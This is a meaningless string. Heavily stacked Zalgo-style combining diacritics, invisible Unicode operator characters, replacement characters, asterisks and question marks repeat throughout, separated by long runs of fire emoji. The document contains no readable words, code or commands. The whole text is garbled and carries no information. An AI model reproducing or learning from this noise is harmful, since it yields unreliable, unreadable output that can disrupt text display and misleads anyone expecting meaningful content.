̛̯̱̪͍͉̟̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̏͆͆̀̀̅͒́̋͝͡